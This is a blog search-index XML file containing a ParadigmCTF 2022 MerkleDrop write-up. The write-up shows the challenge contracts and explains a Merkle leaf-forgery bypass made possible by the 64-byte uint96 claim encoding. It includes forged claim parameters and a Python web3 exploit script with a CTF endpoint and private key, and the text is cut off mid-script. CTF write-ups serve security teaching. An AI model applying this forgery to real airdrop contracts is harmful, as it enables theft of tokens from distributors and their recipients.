<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ParadigmCTF 2022 MerkleDrop writeup</title>
      <link href="/2022/08/31/paradigmctf-2022-merkledrop-writeup/"/>
      <url>/2022/08/31/paradigmctf-2022-merkledrop-writeup/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/08/31/merkledrop/"/>
      <url>/2022/08/31/merkledrop/</url>
      
        <content type="html"><![CDATA[<h1 id="MerkleDrop"><a href="#MerkleDrop" class="headerlink" title="MerkleDrop"></a>MerkleDrop</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><strong>Setup.sol</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./MerkleDistributor.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token keyword">is</span> ERC20Like <span class="token punctuation">{</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">public</span> allowance<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> totalSupply <span class="token operator">=</span> <span class="token number">1</span>_000_000 ether<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        allowance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>            allowance<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span><span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        balanceOf<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Setup</span> <span class="token punctuation">{</span>    Token <span class="token keyword">public</span> immutable token<span class="token punctuation">;</span>    MerkleDistributor <span class="token keyword">public</span> immutable merkleDistributor<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>        token <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> airdropAmount <span class="token operator">=</span> <span class="token number">75000</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token number">18</span><span class="token punctuation">;</span>        merkleDistributor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MerkleDistributor</span><span class="token punctuation">(</span>            <span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token number">0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>merkleDistributor<span class="token punctuation">)</span><span class="token punctuation">,</span> airdropAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">bool</span> condition1 <span class="token operator">=</span> token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>merkleDistributor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token builtin">bool</span> condition2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>merkleDistributor<span class="token punctuation">.</span><span class="token function">isClaimed</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                condition2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> condition1 <span class="token operator">&amp;&amp;</span> condition2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>MerkleDistributor.sol</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.15</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./MerkleProof.sol"</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">ERC20Like</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> dst<span class="token punctuation">,</span> <span class="token builtin">uint</span> qty<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">MerkleDistributor</span> <span class="token punctuation">{</span>    <span class="token keyword">event</span> <span class="token function">Claimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> immutable token<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> immutable merkleRoot<span class="token punctuation">;</span>    <span class="token comment">// This is a packed array of booleans.</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">private</span> claimedBitMap<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> merkleRoot_<span class="token punctuation">)</span> <span class="token punctuation">{</span>        token <span class="token operator">=</span> token_<span class="token punctuation">;</span>        merkleRoot <span class="token operator">=</span> merkleRoot_<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isClaimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> claimedWordIndex <span class="token operator">=</span> index <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedBitIndex <span class="token operator">=</span> index <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedWord <span class="token operator">=</span> claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> claimedBitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> claimedWord <span class="token operator">&amp;</span> mask <span class="token operator">==</span> mask<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_setClaimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> claimedWordIndex <span class="token operator">=</span> index <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedBitIndex <span class="token operator">=</span> index <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span> <span class="token operator">=</span> claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> claimedBitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint96</span> amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isClaimed</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Drop already claimed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Verify the merkle proof.</span>        <span class="token builtin">bytes32</span> node <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>MerkleProof<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>merkleProof<span class="token punctuation">,</span> merkleRoot<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Invalid proof.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Mark it claimed and send the token.</span>        <span class="token function">_setClaimed</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">ERC20Like</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Transfer failed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Claimed</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>And <em>tree.json</em> which include whole tree data, the total amount of recipients is 75000 ethers.</p><p>The Setup contract issues a token to the MerkleDistributor contract. And builds a MerkleTree with <strong>Hardcode MerkleRoot</strong> </p><p>The condition to solve the puzzle is:</p><ul><li>distribute all tokens in MerkleDistributor account</li><li>remain at least one recipient account <strong>NO CLAIMED</strong></li></ul><p>It seem that is a “Mission Impossible”. But it is not.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p><a href="https://github.com/Uniswap/merkle-distributor">merkle-distributor</a><br>A smart contract that distributes a balance of tokens according to a merkle root<br>Using this contract we can implement distribute a token by merkletree.</p><p>However, to compare with the repository of merkle-distributor, I find a small bug in the contract.</p><p><strong>Official contract</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span> override<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Task contract</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint96</span> amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The parameter <em>amount</em> is uint96 rather than uint256.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>According to the definition and principle of merkletree, every branch node is calculated by keccak256(bytes32, bytes32).</p><p>We notice that the parameter of claim (uint256, address, uint96) exaclty is 64 bytes.(32 + 20 + 12).<br>With calculated abi.encodePacked(index, account, amount), we <strong>can forge a fake leaf node using branch node to bypass the merkle proof</strong>. Thus, we can emit a transfer with no claim index 0 - 63.</p><p>First, we need two branches node to calculate another branch node, which can bypass the merkle proof with correct merkleProof, it is easy to build.</p><p>The most important condition for suitable branch node hash is: <strong>the last 12 bytes MUST be smaller than 75000 ethers</strong>, otherwise we can’t to call transfer token.</p><p>After seaching in <em>tree.json</em>, we found<br><code>              0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b</code>, with <strong>precalculated hashdict</strong>, we can find its sibling node hash <code>0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442</code><br>so we submit a claim with parameters:</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"index"</span><span class="token operator">:</span> 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442<span class="token punctuation">,</span>    <span class="token property">"account"</span><span class="token operator">:</span> <span class="token string">"0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A"</span><span class="token punctuation">,</span>    <span class="token property">"amount"</span><span class="token operator">:</span> 0x00000f40f0c122ae08d2207b<span class="token punctuation">,</span>    <span class="token property">"merkleProof"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d"</span><span class="token punctuation">,</span>        <span class="token string">"0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde"</span><span class="token punctuation">,</span>        <span class="token string">"0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813"</span><span class="token punctuation">,</span>        <span class="token string">"0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c"</span><span class="token punctuation">,</span>        <span class="token string">"0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"</span>        <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Transaction successfully submitted, and the balance of the MerkleDistributor account is 2966562950867434987397. Luckily, is magic number is found in <em>tree.json</em> as amount of <strong>node 8</strong>, so we only need to submitted another transaction to claim node 8, thus we can get the flag.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token punctuation">,</span> HTTPProviderrpc_endpoint<span class="token operator">=</span>   <span class="token string">'http://35.188.148.32:8545/6e853b32-0a87-40bb-bfbf-85e9cf1b22aa'</span>private_key<span class="token operator">=</span>    <span class="token string">'0x8f5753cd5fa023584595730250634e5f2644880987762f1e8a5728918806f1ab'</span>setup_contract<span class="token operator">=</span> <span class="token string">'0xA3D9Eb4AA4b0f9249618B36b85cbd09744d24f71'</span>tree <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'tree.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>MerkleRoot <span class="token operator">=</span> tree<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'merkleRoot'</span><span class="token punctuation">)</span>w3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span>HTTPProvider<span class="token punctuation">(</span>rpc_endpoint<span class="token punctuation">)</span><span class="token punctuation">)</span>account <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>privateKeyToAccount<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>setup_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/Setup.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>MerkDrop_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/MerkleDistributor.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>token_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/Token.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>setup_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>setup_contract<span class="token punctuation">,</span> abi<span class="token operator">=</span>setup_abi<span class="token punctuation">)</span>MerkDrop_address <span class="token operator">=</span> setup_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>merkleDistributor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>MerkDrop_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>MerkDrop_address<span class="token punctuation">,</span> abi<span class="token operator">=</span>MerkDrop_abi<span class="token punctuation">)</span>token_addr <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>token<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>token_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>token_addr<span class="token punctuation">,</span> abi<span class="token operator">=</span>token_abi<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442</span>addr <span class="token operator">=</span> <span class="token string">'0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A'</span>amount <span class="token operator">=</span> <span class="token number">0x00000f40f0c122ae08d2207b</span>proof <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d'</span><span class="token punctuation">,</span><span class="token string">'0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde'</span><span class="token punctuation">,</span><span class="token string">'0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813'</span><span class="token punctuation">,</span><span class="token string">'0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c'</span><span class="token punctuation">,</span><span class="token string">'0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5'</span><span class="token punctuation">]</span>TransactionData <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'claim'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> proof<span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span><span class="token keyword">assert</span> txrecipet<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>        amount <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>        Proof <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'proof'</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> setup_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>isSolved<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        TransactionData <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'claim'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>amount<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Proof<span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>            <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>            <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>            <span class="token string">'gasPrice'</span><span 